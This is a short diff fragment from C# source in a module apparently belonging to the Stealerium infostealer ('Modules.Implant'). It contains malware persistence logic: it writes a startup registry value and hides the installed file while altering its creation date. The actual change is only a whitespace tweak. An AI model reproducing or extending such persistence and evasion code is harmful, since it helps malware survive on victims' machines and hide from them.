@@ -63,7 +63,7 @@ namespace Stealerium.Modules.Implant
             if (rkApp != null && rkApp.GetValue(StartupName) == null)
                 rkApp.SetValue(StartupName, InstallFile);
             // Hide files & change creation date
-            foreach (var file in new[] {InstallFile})
+            foreach (var file in new[] { InstallFile })
                 if (File.Exists(file))
                 {
                     HideFile(file);
